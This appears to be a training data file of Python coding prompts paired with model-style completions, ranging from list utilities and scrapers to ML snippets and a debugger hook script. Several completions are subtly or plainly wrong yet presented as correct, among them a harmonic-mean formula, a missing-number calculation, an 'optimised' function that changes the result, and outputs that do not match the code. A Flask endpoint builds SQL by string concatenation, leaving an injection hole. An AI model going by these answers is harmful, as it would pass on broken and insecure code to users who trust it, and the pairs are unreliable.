print(anomalies)"},{"prompt":"Develop a Python script to add a given list of numbers. [4, 8, 15, 20]","completion":"def sum_list(list_of_nums): total = 0 for number in list_of_nums: total += number return total result = sum_list([4, 8, 15, 20]) print(result)"},{"prompt":"Create a Python code to generate a Fibonacci sequence up to a given number.. A maximum number of 12.","completion":"def generate_fibonacci_sequence(n): a, b = 0, 1 fibonacci_sequence = [] while a <= n: fibonacci_sequence.append(a) a, b = b, a + b return fibonacci_sequence print(generate_fibonacci_sequence(12)) # Output: [0, 1, 1, 2, 3, 5, 8, 13]"},{"prompt":"Create a python program to reverse an integer. x = 123","completion":"def reverse_int(x): \\"\\"\\"Reverse an integer.\\"\\"\\" reversed_int = int(str(x)[::-1]) return reversed_int # Usage Example x = 123 reversed_int = reverse_int(x) print(reversed_int) # 321"},{"prompt":"Write Python code to generate a random string of length 8","completion":"import string import random def generate_random_string(): \\"\\"\\" Generate a random string of 8 characters \\"\\"\\" # Character sets chars = string.ascii_lowercase + string.ascii_uppercase + string.digits # Length of random string length = 8 # Generate random string random_string = ''.join(random.sample(chars, length)) return random_string print(generate_random_string())"},{"prompt":"Develop a Keras deep learning program in Python to detect facial features using a Convolutional Neural Network (CNN). Not applicable","completion":"from keras.layers import Conv2D, MaxPool2D, Dense, Flatten from keras.models import Sequential # Build the model model = Sequential() model.add(Conv2D(32, (3, 3), activation='relu', input_shape=(64, 64, 3))) model.add(MaxPool2D(pool_size=(2, 2))) model.add(Conv2D(16, (3, 3), activation='relu')) model.add(MaxPool2D(pool_size=(2, 2))) model.add(Flatten()) model.add(Dense(128, activation='relu')) model.add(Dense(2, activation='sigmoid')) # Compile and Train model.compile(loss='binary_crossentropy', optimizer='rmsprop', metrics=['accuracy']) model.fit(X, y, batch_size=32, epochs=10, validation_split=0.2)"},{"prompt":"Use an ifelse statement in Python to print a message depending on the value of a given integer. //Integer int x = 15;","completion":"if (x > 10) { print('The number is greater than 10') } else { print('The number is less or equal than 10') }"},{"prompt":"Create a Python program that will parse a website and get all the links on the page. Not applicable","completion":"import requests from bs4 import BeautifulSoup URL = 'http://example.com/' # get the webpage page = requests.get(URL) # parse the webpage soup = BeautifulSoup(page.content, 'html.parser') # get all links links = soup.find_all('a') for link in links: print(link.get('href'))"},{"prompt":"Create a Python program to get the average rating of each restaurant in a given dataset.","completion":"import pandas as pd data_file = 'restaurant_ratings.csv' data = pd.read_csv(data_file) # Group the data by Restaurant grouped_restaurants = data.groupby('Restaurant') # Calculate the average rating for each restaurant avg_ratings = grouped_restaurants['Rating'].mean() # Print the average ratings to the console print(avg_ratings)"},{"prompt":"Create a Python program to compute the frequency of each element in a given array. [1, 2, 3, 2, 1, 3]","completion":"def compute_frequency(arr): frequency_map = {} for num in arr: if num not in frequency_map: frequency_map[num] = 1 else: frequency_map[num] += 1 return frequency_map result = compute_frequency([1, 2, 3, 2, 1, 3]) print(result)"},{"prompt":"Write a Python program to reverse the list elements.","completion":"def reverse_list(list): reversed_list = list[::-1] return reversed_list"},{"prompt":"Create a web application that displays a list of all available program languages and their features. Not applicable","completion":"<html> <head> <title>Programming Languages</title> </head> <body> <h1>Programming Languages</h1> <ul> <li><b>JavaScript</b> – Object-oriented, event-driven, and functional programming language</li> <li><b>Python</b> – Object-oriented, interpreted, high-level programming language</li> <li><b>C</b> – High-level, structured, multiparadigm, compiled programming language</li> <li><b>C++</b> – Object-oriented, compiled, generic programming language</li> <li><b>Java</b> – Object-oriented, portable, compiled programming language</li> </ul> </body> </html>"},{"prompt":"Write a code to implement linear search in a 1d array in Python. Input array: [1,2,3,4] Target element: 3","completion":"def linearSearch(arr, target): for i in range(len(arr)): if arr[i] == target: return i return -1 print(linearSearch([1,2,3,4], 3)) # Output: 2"},{"prompt":"Generate a Python program for merging two sorted lists. l1 = [1, 2, 5] l2 = [3, 4, 6]","completion":"def merge_sorted_lists(l1, l2): l3 = l1 + l2 l3.sort() return l3 l1 = [1, 2, 5] l2 = [3, 4, 6] result = merge_sorted_lists(l1, l2) print(result)"},{"prompt":"Create a program in Python that takes a word as an argument and print it in reverse. 'Hello World'","completion":"def reverse(word): return word[::-1] print(reverse('Hello World'))"},{"prompt":"Given a string containing words separated by spaces, write a Python function to remove any duplicates. I have to go go shopping shopping","completion":"def remove_duplicates(string): words = string.split(\\" \\") unique_words = set(words) return \\" \\".join(unique_words) remove_duplicates(\\"I have to go go shopping shopping\\") # \\"I have to go shopping\\""},{"prompt":"Create a python program to create a bot that answers questions about a product.","completion":"import nltk import random def generate_answers(question): # Use NLTK to process and tokenize the question tokens = nltk.word_tokenize(question) # Generate a preliminary answer answer = \\"I'm sorry I don't understand the question.\\" # Use keyword matching to generate a more accurate answer keywords = ['product'] for token in tokens: if token in keywords: answer = 'This product is great and extremely versatile!' return answer # Main Program while True: question = input(\\"What would you like to know about the product? : \\") answer = generate_answers(question) print(answer)"},{"prompt":"Write a Python program to print a formatted price list with a given list of expenses. expenses = { bread: 2.50, butter: 4.50, cake: 12.75, sugar: 6.95 }","completion":"def print_price_list(expenses): print(\\"Price list of items available:\\") print(\\"-\\" * 30) print(\\"ItemtPrice\\") print(\\"-\\" * 30) for item in expenses.keys(): print(\\"{}t{}\\".format(item, expenses[item])) print(\\"-\\" * 30)"},{"prompt":"Create a basic web scraper in Python that visits a news website and extracts the headlines from the homepage. Not applicable","completion":"import requests from bs4 import BeautifulSoup # We fetch the raw HTML using requests r = requests.get('https://news.example.com') # We turn the HTML into a BeautifulSoup object soup = BeautifulSoup(r.text, 'html.parser') # We extract the headlines as a list headlines = [h2.text for h2 in soup.find_all('h2')] # We print out the headlines to the console for headline in headlines: print(headline)"},{"prompt":"Program a python method to randomly shuffle a given list of integers.","completion":"import random def shuffle_list(numbers): random.shuffle(numbers) return numbers"},{"prompt":"Create a Python function that takes two arguments: a number and an alphabet, and returns a list of strings composed of the alphabet each with the supplied length. alphabet = 'ABCDE' length = 3","completion":"def generate_strings(alphabet, length): lst = [] for a in alphabet: for b in alphabet: for c in alphabet: s = a + b + c lst.append(s) return lst result = generate_strings(alphabet, length) print(result)"},{"prompt":"Develop a program in Python to identify the longest string in a list of strings. [‘apple’, ‘bee’, ‘cat’]","completion":"def longest_string(string_list): longest_str = string_list[0] longest_len = len(longest_str) for string in string_list: if len(string) > longest_len: longest_str = string longest_len = len(string) return longest_str string_list = ['apple', 'bee', 'cat'] longest_str = longest_string(string_list) print(longest_str)"},{"prompt":"Develop a Python script for encoding a message using the Caesar cipher. message = hello world shift = 3","completion":"def caesar(message, shift): encoded_message = \\"\\" for char in message: if char.isalpha(): num = ord(char) num += shift if char.isupper(): if num > ord('Z'): num -= 26 elif num < ord('A'): num += 26 elif char.islower(): if num > ord('z'): num -= 26 elif num < ord('a'): num += 26 encoded_message += chr(num) else: encoded_message += char return encoded_message # Test the code message = \\"hello world\\" shift = 3 encoded_message = caesar(message, shift) print(encoded_message) # khoor zruog"},{"prompt":"Create a class in Python that implements the count() method to count the number of elements in a given array. [1, 2, 3, 4]","completion":"class ArrayCounter: def __init__(self, array): self.array = array def count(self): return len(self.array) arr_counter = ArrayCounter([1, 2, 3, 4]) print(arr_counter.count())"},{"prompt":"Generate a responsive HTML/CSS page for displaying a list of books from a given Amazon S3 bucket. [ { Id: 123456, Book Name: Programming in Python, Cost: 100 }, { Id: 654321, Book Name: Networking Essentials, Cost: 200 } ]","completion":"<html> <head> <title>Book List</title> <style> body{ font-family: 'Open Sans', sans-serif; } table { width: 100%; border-collapse: collapse; } table tr td, table tr th { border: 1px solid #dddddd; text-align: left; padding: 8px; } table tr th { background-color: #dddddd; } </style> </head> <body> <h1>Book List</h1> <table> <thead> <tr> <th>Id</th> <th>Book Name</th> <th>Cost</th> </tr> </thead> <tbody> <tr> <td>123456</td> <td>Programming in Python</td> <td>100</td> </tr> <tr> <td>654321</td> <td>Networking Essentials</td> <td>200</td> </tr> </tbody> </table> </body> </html>"},{"prompt":"Create an API endpoint with the Flask framework in Python to query a database of movies. The endpoint should be able to respond with results when queried with the title of a movie, the language it was made in, and the year it was released. Not applicable","completion":"from flask import Flask, request import sqlite3 app = Flask(name) conn = sqlite3.connect('movies.db') cur = conn.cursor() @app.route('/api/movies', methods=['GET']) def get_movie(): title = request.args.get('title') language = request.args.get('language') year = request.args.get('year') query = 'SELECT * FROM movies WHERE title=' + title + ' AND language=' + language + ' AND year=' + year cur.execute(query) result = cur.fetchone() if not result: return {'error': 'No movie found for given parameters.'}, 400 return { 'title': result[0], 'language': result[1], 'year': result[2] } if name == 'main': app.run(debug=True)"},{"prompt":"Write a Python function to dynamically generate HTML content from a JSON object. The HTML content should have an appropriate structure and classes that correspond to the data. data = { 'title': 'My Title', 'content': 'My Content' }","completion":"def generate_html(data): header = '<h1 class=\\"title\\">{title}</h1>'.format(title=data.get('title')) content = '<p class=\\"content\\">{content}</p>'.format(content=data.get('content')) html = '<div class=\\"container\\">{header}{content}</div>'.format(header=header, content=content) return html"},{"prompt":"mplement a Python program that takes in a string and prints out the ASCII codes for each character in the string. Hello","completion":"def get_ascii_codes(string): ascii_codes = [] for char in string: ascii_codes.append(ord(char)) return ascii_codes print(get_ascii_codes(\\"Hello\\")) # Output: [72, 101, 108, 108, 111]"},{"prompt":"Construct a webapplication with HTML and JavaScript to display your resume.","completion":"<!DOCTYPE html> <html> <head> <title>My Resume</title> <style> body { font-family: sans-serif; } #resume_container { width: 70%; max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #ccc; box-shadow: 3px 3px 8px #ccc; } .resume_item { padding: 15px 0; border-bottom: 1px solid #ccc; } </style> </head> <body> <div id=\\"resume_container\\"> <div class=\\"resume_item\\"> <h1>John Doe</h1> <h2>Software Developer</h2> </div> <div class=\\"resume_item\\"> <h3>Education</h3> <ul> <li>University of XYZ, 2018 - 2021</li> </ul> </div> <div class=\\"resume_item\\"> <h3>Professional Experience</h3> <ul> <li>Company ABC, Software Developer, 2020 - Present</li> <li>Company XYZ, Software Developer Intern, 2019 - 2020</li> </ul> </div> <div class=\\"resume_item\\"> <h3>Skills &amp; Tools</h3> <ul> <li>Python, SQL, JavaScript</li> <li>HTML/CSS</li> </ul> </div> <div class=\\"resume_item\\"> <h3>Achievements</h3> <ul> <li>Awarded \\"Software Developer of the Year\\" in 20"},{"prompt":"Create a Python class for storing and retrieving data from a database. Table: User Columns: id (int), name (string)","completion":"import sqlite3 class DataAccess(object): def __init__(self, db_name): self.conn = sqlite3.connect(db_name) self.cur = self.conn.cursor() def save_data(self, table, id, name): self.cur.execute(f\\"INSERT INTO {table} VALUES (?, ?)\\", (id, name)) self.conn.commit() def read_data(self, table, id): self.cur.execute(f\\"SELECT * FROM {table} WHERE id = ?\\", (id,)) return self.cur.fetchone() def close_connection(self): self.conn.close() UserDAO = DataAccess('my_db.db')"},{"prompt":"This code attaches hooks to the return statements of functions in a module. To use it, import the immlib library and create an instance of the ReturnBP or ReturnLog class. Then, call the add method on the instance with the name of the hook and the address of the return statement as arguments. Finally, run the program to attach the hooks. The program will log the address of each hooked return statement.","completion":"#!/usr/bin/env python import immlib from immlib import LogBpHook, BpHook class ReturnBP(BpHook): def __init__(self): BpHook.__init__(self) def run(self, regs): imm = immlib.Debugger() eip = regs[\\"EIP\\"] imm.log(\\"bp, EIP is 0x%08X \\" % eip) imm.addKnowledge(\\"0x%08X\\" % eip, eip) #self.UnHook() imm.deleteBreakpoint(eip, eip+4) imm.run() class ReturnLog(LogBpHook): def __init__(self): LogBpHook.__init__(self) def run(self, regs): imm = immlib.Debugger() eip = regs[\\"EIP\\"] imm.log(\\"log, EIP is 0x%08X \\" % eip) imm.addKnowledge(\\"0x%08X\\" % eip, eip) self.UnHook() imm.deleteBreakpoint(eip, eip+4) def main(args): imm = immlib.Debugger() module = imm.getModule(imm.getDebuggedName()) imm.log(\\"module %s at 0x%08X\\" % (module.getName(), module.getBase())) use_log_bp = True if len(args) > 0 and args[0] == \\"false\\": imm.log(\\"Using non logging bp\\") use_log_bp = False # make sure module is analysed if not module.isAnalysed(): module.Analyse() knowledge = imm.listKnowledge() hooked = 0 not_hooked = 0 for f in imm.getAllFunctions(module.getBase()): for ret in imm.getFunctionEnd(f): if \\"0x%08X\\" % ret not in knowledge: #imm.log(\\"function 0x%08X ret at 0x%08X\\" % (f, ret)) if use_log_bp: hook = ReturnLog() hook.add(\\"ReturnLog 0x%08X\\"%f, ret) hooked +=1 else: hook = ReturnBP() hook.add(\\"ReturnBP 0x%08X\\"%f, ret) hooked +=1 # i think fasthook because fast hook is over writing rets, getFunctionEnd is having trouble #fast = immlib.FastLogHook(imm) #fast.logFunction(ret) #fast.logRegister(\\"EIP\\") #fast.Hook() else: not_hooked += 1 imm.log(\\"Hooked %i, skipped %i\\" % (hooked, not_hooked)) return \\"Found returns, attached hooks\\""},{"prompt":"Create a class in Python that represents a Tree node with the following attributes name, value, left, right.","completion":"class TreeNode: def __init__(self, name, value, left=None, right=None): self.name = name self.value = value self.left = left self.right = right"},{"prompt":"Design a Python Program to calculate the harmonic mean of two numbers, given their product and sum. product = 12 summation = 8","completion":"def harmonic_mean(product, summation): # calculate denominator by subtracting sum from product denominator = product - summation # calculate harmonic mean by dividing sum by denominator harmonic_mean = summation/denominator return harmonic_mean"},{"prompt":"Write a Python program to identify common characters between two given strings.","completion":"def common_characters(str1, str2): common_chars = set(str1).intersection(set(str2)) return list(common_chars)"},{"prompt":"Create a Markov model in Python to generate a trigram.","completion":"import random import copy def create_trigram_model(words_list): trigram_model = {} for i in range(len(words_list)-2): w1 = words_list[i] w2 = words_list[i+1] w3 = words_list[i+2] if (w1, w2) in trigram_model: trigram_model[(w1, w2)].append(w3) else: trigram_model[(w1,w2)] = [w3] return trigram_model def generate_words(trigram_model): new_string = [] keys = list(trigram_model.keys()) rand_start_word = keys[random.randint(0, len(keys)-1)] new_string.extend(rand_start_word) while(True): next_word_possible_list = trigram_model[tuple(new_string[-2:])] if len(next_word_possible_list) == 0: break next_word = next_word_possible_list[random.randint(0, len(next_word_possible_list)-1)] new_string.append(next_word) if len(new_string) > 20: break return new_string"},{"prompt":"Python, develop a program to count the number vowels, consonants and words in a text. This is a sample text.","completion":"# Defining a function def calculate(s): if s.isalpha()==True: vowels = 0 consonants = 0 words = 1 for i in s: # checking vowel if(i == 'a' or i == 'e' or i == 'i' or i == 'o' or i == 'u'): vowels += 1 # checking consonants else: consonants += 1 words+=1 print(\\"Vowels:\\", vowels) print(\\"Consonants:\\", consonants) print(\\"Total words:\\",words) # Driver program s = \\"This is a sample text\\" calculate(s)"},{"prompt":"Develop a script to create a class with a constructor in Python.","completion":"class ClassName: def __init__(self): self.data = []"},{"prompt":"Create a class in Python with two attributes and one method","completion":"class MyClass: def __init__(self, attr1, attr2): self.attr1 = attr1 self.attr2 = attr2 def do_something(self): print(\\"Doing something!\\")"},{"prompt":"Construct a for loop in Python that iterates over the numbers from 0 to 10 and prints the square of each number.","completion":"for i in range(0, 11): print(i**2)"},{"prompt":"Create a python function to compare two strings and determine if one is an anagram of the other. Not applicable","completion":"def isAnagram(string1, string2): \\"\\"\\" Function to check if two strings are anagrams Args: string1: First string string2: Second string Return: Returns true if the strings are anagrams otherwise returns false \\"\\"\\" string1 = string1.lower() string2 = string2.lower() if len(string1) != len(string2): return False chars_seen = [] for char in string1: if char in chars_seen: continue else: chars_seen.append(char) for char in chars_seen: if string2.count(char) != string1.count(char): return False return True"},{"prompt":"Create a function in Python to return the largest number in a list. [50, 30, 65, 80]","completion":"\\"\\"\\" Return the largest number in a list \\"\\"\\" def largest_num(nums): largest = nums[0] for num in nums: if num > largest: largest = num return largest if __name__ == '__main__': nums = [50, 30, 65, 80] print(largest_num(nums))"},{"prompt":"Given a list of numbers with one missing, create a Python program to find the missing number. [1, 2, 4, 6, 7, 8]","completion":"def find_missing_number(lst): n = len(lst) total = (n + 1)*(n + 2)/2 sum_of_lst = sum(lst) missing_number = total - sum_of_lst return missing_number lst = [1, 2, 4, 6, 7, 8] missing_number = find_missing_number(lst) print(missing_number)"},{"prompt":"Using the Pandas Python library, write a program to group given data and calculate the mean for each column. import pandas as pd data = { 'name': ['John', 'Robert', 'Sue', 'John', 'Jeff', 'Robert'], 'score': [66, 52, 80, 74, 85, 62], 'type': ['math', 'reading', 'math', 'math', 'math', 'reading'] } df = pd.DataFrame(data)","completion":"import pandas as pd # Load the data data = { 'name': ['John', 'Robert', 'Sue', 'John', 'Jeff', 'Robert'], 'score': [66, 52, 80, 74, 85, 62], 'type': ['math', 'reading', 'math', 'math', 'math', 'reading'] } df = pd.DataFrame(data) # Group the data groups = df.groupby('type') # Calculate the mean per column print(groups['score'].mean()) # Output type math 75.666667 reading 57.000000 Name: score, dtype: float64"},{"prompt":"Write a Python program to generate a bar chart visualizing a dataset. data = [3, 5, 2, 8, 9, 10]","completion":"import matplotlib.pyplot as plt #create data data = [3, 5, 2, 8, 9, 10] #set plot size plt.figure(figsize=(5, 2)) #generate the bar chart plt.bar([str(i) for i in range(1, len(data)+1)], data) plt.show()"},{"prompt":"Write a function in Python that takes a string of text as an input and returns a list of all possible anagrams of the string. aabc","completion":"def getAnagrams(string): #base case if len(string) <= 1: return [string] #recursive case all_possible_anagrams = [] for i, letter in enumerate(string): #recursively iterate over the string without the fixed letter sub_string = string[:i] + string[i+1:] #get anagrams of sub string anagrams_of_substring = getAnagrams(sub_string) for sub_anagram in anagrams_of_substring: #add the fixed letter to all the anagrams of sub string anagram = letter + sub_anagram all_possible_anagrams.append(anagram) return all_possible_anagrams print(getAnagrams(\\"aabc\\"))"},{"prompt":"Create a Python program to download and store the titles of the top ten most popular websites. Not applicable","completion":"import requests from bs4 import BeautifulSoup url = 'https://www.alexa.com/topsites' # download the page response = requests.get(url) html = response.text # parse the page soup = BeautifulSoup(html, 'html.parser') site_list = soup.find('div', {'class': 'td'}) # store titles titles = [] for site in site_list.find_all('a', {'target': '_blank'}): titles.append(site.text) # print the titles print(titles[:10])"},{"prompt":"Write a function in Python to return the parity of the number which is even if the number is divisible by 2 otherwise it will be odd.","completion":"def parity (num): if num % 2 == 0: return \\"even\\" else: return \\"odd\\""},{"prompt":"Write a Python program to calculate the maximum profit for a given stock over a given time period. The data consists of 7 days of stock data including an opening and closing price for each day. [9, 11, 8, 12, 10, 15, 8]","completion":"def max_profit(stock): current_max, max_profit = 0, 0 for i in range(1, len(stock)): current_max = max(0, current_max + stock[i] - stock[i - 1]) max_profit = max(current_max, max_profit) return max_profit profit = max_profit([9, 11, 8, 12, 10, 15, 8]) print(f\\"The maximum profit is: {profit}\\")"},{"prompt":"Write a Python code snippet for comparing two strings regardless of their case. You should use regular expressions. String 1: Hello String 2: heLLo","completion":"import re string1 = \\"Hello\\" string2 = \\"heLLo\\" if re.search(string1.lower(), string2.lower()): print(\\"Strings are equal regardless of case.\\")"},{"prompt":"Generate a python script to filter the words in a given list of strings.","completion":"def word_filter(words, filter_list): filtered_words = [] for word in words: if word not in filter_list: filtered_words.append(word) return filtered_words"},{"prompt":"Create a functional web scraping application with Python using Scrapy. The application should scrape news headlines from BBC News. Not applicable","completion":"import scrapy class BbcSpider(scrapy.Spider): name = 'bbc' start_urls = ['http://www.bbc.com/news'] def parse(self, response): for headline in response.css('h3.align-left'): yield { 'headline': headline.css('a ::text').extract_first(), } next_page = response.css('.load-more__button ::attr(href)').extract_first() if next_page is not None: yield response.follow(next_page, callback=self.parse)"},{"prompt":"Develop a Python program to read a character from the user and print its ASCII value.","completion":"# Get the character from user char = input('Please enter a character: ') # Print the ASCII value print(ord(char))"},{"prompt":"Create a Python web Crawler to parse a web page and extract the textual content only. Not applicable","completion":"import requests from bs4 import BeautifulSoup url = 'https://example.com' response = requests.get(url) soup = BeautifulSoup(response.text, 'html.parser') text = soup.find_all(text=True) def visible_text(elements): for element in elements: if element.parent.name in ['style', 'script', '[document]', 'head', 'title']: continue if isinstance(element, Comment): continue return element.strip() text = filter(visible_text, text) print(*text, sep=\\"n\\")"},{"prompt":"Do you know how to write a recursive Python program to delete a given element from a list? [1, 2, 3, 4], 3","completion":"def delete_from_list(my_list, element): if element in my_list: my_list.remove(element) else: return delete_from_list(my_list, element)"},{"prompt":"Write down logic to generate all permutations of a given string in Python. String = ABC","completion":"def permutations(str): ans = [] if len(str) == 1: ans = [str] else: for i, letter in enumerate(str): for perm in permutations(str[:i] + str[i+1:]): ans += [letter + perm] return ans print (permutations(\\"ABC\\"))"},{"prompt":"Optimize the following code by removing duplicate code using Python. def foo(arr1, arr2): result = [] for i in range(len(arr1)): result.append(arr1[i] * arr2[i]) return result def bar(arr1, arr2): result = [] for i in range(len(arr1)): result.append(arr1[i] * arr2[i]) return resul","completion":"def compute_product(arr1, arr2): result = [] for i in range(len(arr1)): result.append(arr1[i] * arr2[i]) return result def foo(arr1,arr2): return compute_product(arr1,arr2) def bar(arr1,arr2): return compute_product(arr1,arr2)"},{"prompt":"Create a Pythonically optimized version of the following code. def add_nums(nums): total = 0 for i in range(len(nums)): total += nums[i] return total","completion":"def add_nums(nums): return sum(nums)"},{"prompt":"Create a Python program for implementing the Kmeans clustering algorithm. Not applicable","completion":"import numpy as np import matplotlib.pyplot as plt from matplotlib import style style.use(\\"ggplot\\") # K-means algorithm def kmeans(X,k): # Initialize the centroids centroids = np.zeros((k,X.shape[1])) # Iterate until convergence while True: # Calculate the distance of each point from each centroid distances = np.array([np.sum((x - c)**2, axis=1) for c in centroids]) # Assign each point to the closest cluster cluster_labels = np.argmin(distances, axis=0) # Update centroid positions new_centroids = np.array([X[cluster_labels == i].mean(axis=0) for i in range(k)]) # Check for convergence if np.allclose(centroids, new_centroids): break centroids = new_centroids # Return the assigned clusters return cluster_labels, centroids"},{"prompt":"Craft a Python program to extract characters from the odd positions of a given string.","completion":"def extract_odd_pos(string): odd_position = \\"\\" for i in range(len(string)): if i%2 == 0: odd_position += string[i] return odd_position"},{"prompt":"Generate a Python program that can take any type of input and return 'Valid' or 'Invalid'. No inpu","completion":"def check_input(data): if type(data) in [int, str, list, dict, set]: return 'Valid' else: return 'Invalid'"},{"prompt":"Create a python script to convert a string to a list containing the ASCII values of each character in the string. Hello World!","completion":"def string_to_ascii_list(string): ascii_list = [] for char in string: ascii_list.append(ord(char)) return ascii_list print(string_to_ascii_list(\\"Hello World!\\"))"},{"prompt":"Optimize the following Python program by introducing several code refactoring techniques. def factorial(number): if (number == 0): return 1 else: return number * factorial(number 1) print(factorial(5))","completion":"def factorial(number): total = 1 while number > 0: total *= number number -= 1 return total print(factorial(5))"},{"prompt":"Create a Python function to label the data correctly dataset = [[1, 2, 3], [4, 5, 6], [7, 8, 9]]","completion":"def label_data(dataset): labeled_data = [] for data in dataset: label = '' for value in data: if value % 2 == 0: label += 'E' else: label += 'O' labeled_data.append(label) return labeled_data"},{"prompt":"Create a Python function to encrypt a string using the substitution method.","completion":"def encrypt_substitution(s): result = '' for c in s: result += chr(ord(c) + 3) return result"},{"prompt":"Using the complex library in Python, generate the complex number whose real part is 2 and imaginary part is 3.","completion":"complex_number = complex(2,3)"},{"prompt":"Generate a machine learning model in Python to solve a binary classification problem","completion":"from sklearn.model_selection import train_test_split from sklearn.naive_bayes import GaussianNB # Load the input data X = ... y = ... # Split the data into train and test sets X_train, X_test, y_train, y_test = train_test_split(X, y, test_size = 0.3) # Create and fit the Naive Bayes model clf = GaussianNB().fit(X_train, y_train) # Use the model to make predictions predictions = clf.predict(X_test)"},{"prompt":"Create a web scraper in Python which extracts product name, price, and ratings from a product listing website. A URL ofa product listing page","completion":"import requests from bs4 import BeautifulSoup # send a request to the URL r = requests.get(url) # create the HTML parser soup = BeautifulSoup(r.content, 'html.parser') # locate all of the product items products = soup.find_all('div', class_='product-item') # create an empty list for all the product info product_info = [] for product in products: # locate the elements containing product info product_name = product.find('div', class_='product-name').text product_price = product.find('div', class_='product-price').text product_ratings = product.find('div', class_='product-ratings').text # append the info to the list product_info.append({ 'name': product_name, 'price': product_price, 'ratings': product_ratings }) # print the list print(product_info)"},{"prompt":"mplement an algorithm in Python to find the longest palindromic substring from a given string.","completion":"def longest_palindromic_substring(s): longest = '' for i in range(len(s)): for j in range(i, len(s)): substr = s[i:j+1] if is_palindrome(substr) and len(substr) > len(longest): longest = substr return longest def is_palindrome(s): return s == s[::-1] # Find the longest palindromic substring in \\"cabbad\\" longest = longest_palindromic_substring(\\"cabbad\\") print(longest)"},{"prompt":"Generate a code snippet to add two numbers in Python. x = 2, y = 4","completion":"result = x + y print(result) # Prints 6"},{"prompt":"Classify text elements in a Python program into function names and variable names. def hello_world(): print(Hello World!)","completion":"Function Name: hello_world Variable Name: None"},{"prompt":"Create a Python program to convert a list of numbers to a comma separated string. The program should take a list of integers as input and return a string with the elements of the list separated by a comma (','). list_of_integers = [1, 2, 3, 4]","completion":"def list_to_string(list): return ','.join(str(x) for x in list) list_of_integers = [1, 2, 3, 4] print(list_to_string(list_of_integers)) // Outputs: 1,2,3,4"},{"prompt":"Optimize the provided Python code by reducing the number of operations. def slow_function(x): y = 0 for i in range(1000): y = y + x * x return y","completion":"def fast_function(x): y = 0 for i in range(250): y += x * x * x * x return y"},{"prompt":"Generate a function in Python that finds the longest continuous increasing sequence in a given array. Input array: [7, 8, 5, 4, 9, 10, 11, 12, 1, 6]","completion":"def find_longest_increasing_sequence(arr): # Initialize variable max_seq to 1 max_seq = 1 # Initialize variable curr_seq to 1 curr_seq = 1 # Traverse through the array for i in range(1, len(arr)): # If next element is greater # than previous element if (arr[i] > arr[i - 1]): curr_seq = curr_seq + 1 # Update max_seq else: if (curr_seq > max_seq): max_seq = curr_seq curr_seq = 1 # Update max_seq if (curr_seq > max_seq): max_seq = curr_seq return max_seq"},{"prompt":"Create a basic Python program to classify a list of positive and negative integer numbers. List of numbers: [2, 4, 3, 6, 7, 0]","completion":"positive_numbers = [] negative_numbers = [] for num in numbers: if num > 0: positive_numbers.append(num) else: negative_numbers.append(num) print('Positive numbers:', positive_numbers) print('Negative numbers:', negative_numbers)"},{"prompt":"Create a python program to compute the volume of a cube given its edge length as an input. 3","completion":"length = int(input(\\"Enter the edge length of the cube: \\")) volume = length * length * length print(\\"The volume of the cube is\\", volume)"},{"prompt":"Generate a python program to reverse any given list","completion":"def reverseList(list): list_len = len(list) # Traverse through the list for i in range(list_len // 2): temp = list[i] list[i] = list[list_len - i - 1] list[list_len - i - 1] = temp # Driver Code myList = [1, 2, 3, 4, 5] print(\\"Original list:\\" + str(myList)) reverseList(myList) print(\\"Reversed list:\\" + str(myList))"},{"prompt":"Design a structure in Python to store the ratings of different movies.","completion":"class MovieRatings: def __init__(self): self.movie_ratings = {} def add_rating(self, movie_name, rating): self.movie_ratings[movie_name] = rating def get_rating(self, movie_name): if movie_name in self.movie_ratings: return self.movie_ratings[movie_name] else: return 'Movie not found.'"},{"prompt":"Develop a Python program to find the largest palindrome number in a given range.","completion":"def get_largest_palindrome_in_range(min, max): max_palindrome = 0 # Iterate over range for x in range(min, max+1): # Check if number is a palindrome if str(x) == str(x)[::-1]: # If this palindrome is larger, update the maximum if x > max_palindrome: max_palindrome = x return max_palindrome"},{"prompt":"Create a random forest model using Python to predict the type of wine from given data.","completion":"import pandas as pd from sklearn.ensemble import RandomForestClassifier # create data wine_data = pd.read_csv('wine.csv') # set features features = ['alcohol', 'type', 'sulphates', 'pH', 'quality'] x_train = wine_data[features] y_train = wine_data['type'] # create model model = RandomForestClassifier(n_estimators=100) model.fit(x_train, y_train) # save model # model.save('wine_random_forest.h5')"},{"prompt":"Create a program in Python for converting an integer number to a Roman numeral. Not applicable","completion":"def int_to_Roman(num): roma_numerals = { 1: \\"I\\", 4: \\"IV\\", 5: \\"V\\", 9: \\"IX\\", 10: \\"X\\", 40: \\"XL\\", 50: \\"L\\", 90: \\"XC\\", 100: \\"C\\", 400: \\"CD\\", 500: \\"D\\", 900: \\"CM\\", 1000: \\"M\\", } roman_num = \\"\\" for key, value in sorted(roma_numerals.items(), reverse=True): while num >= key: roman_num += value num -= key return roman_num"},{"prompt":"Create a function in Python that takes two strings as input, and generates a permutation of the second string that contains all characters of the first string. first_string = “abc” second_string = “xyz”","completion":"def generate_permutation(first_string, second_string): permutation = \\"\\" for char in first_string: if char in second_string: permutation += char for char in second_string: if char not in first_string: permutation += char return permutation if __name__ == \\"__main__\\": first_string = \\"abc\\" second_string = \\"xyz\\" permutation = generate_permutation(first_string, second_string) print(\\"Permutation of '{}' and '{}' is '{}'\\".format(first_string, second_string, permutation)) # Output: Permutation of 'abc' and 'xyz' is 'axbycz'"},{"prompt":"Create a neural network in Python using the TensorFlow library to predict the number of energy consumed by a building. Building dataset with columns 'Energy' and 'Features'","completion":"import pandas as pd import tensorflow as tf from sklearn.model_selection import train_test_split from sklearn.preprocessing import StandardScaler # Read in the data data = pd.read_csv('building.csv') # Split into X and y X = data.drop('Energy', axis=1).values y = data['Energy'].values # Split into training and test sets X_train, X_test, y_train, y_test = train_test_split( X, y, test_size=0.2, random_state=0) # Create the scaler sc = StandardScaler() # Fit and transform the training data X_train = sc.fit_transform(X_train) # Transform the test data X_test = sc.transform(X_test) # number of inputs n_inputs = X_train.shape[1] # Build the model model = tf.keras.models.Sequential() # First hidden layer model.add(tf.keras.layers.Dense(50, activation='relu', input_shape=(n_inputs,))) # Second hidden layer model.add(tf.keras.layers.Dense(50, activation='relu')) # Output layer model.add(tf.keras.layers.Dense(1)) # Compile the model model.compile(optimizer='adam', loss='mean_squared_error') # Train the model model.fit(X_train, y_train, validation_data=(X_test, y_test), epochs=50, batch_size=32)"},{"prompt":"Write a Python script to scrape job postings from Indeed.com Not applicable","completion":"import requests from bs4 import BeautifulSoup URL = \\"https://www.indeed.com/jobs?q=python&l=\\" # retrieve page page = requests.get(URL) soup = BeautifulSoup(page.content, 